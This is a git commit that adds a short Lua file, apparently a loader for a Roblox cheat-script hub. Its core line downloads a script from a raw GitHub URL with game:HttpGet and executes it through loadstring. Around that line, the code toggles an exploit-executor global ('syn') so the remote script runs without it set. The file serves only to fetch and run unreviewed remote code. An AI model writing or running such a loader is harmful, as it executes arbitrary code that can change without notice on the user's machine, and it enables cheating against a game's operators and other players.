0b3b0f7fc1f19453c7e0205210e899387c1a72a1
Davi <daviboyistop@yahoo.com>
2024-09-26 08:21:22 -0300

    Create .lua

---
+++ .github/Sander/Evadex/.lua
@@ -0,0 +1,6 @@
+local syn = getgenv().syn
+getgenv().syn = false
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/SanderXV2.5/main/SanderXV2.5.lua')))()
+
+getgenv().syn = syn
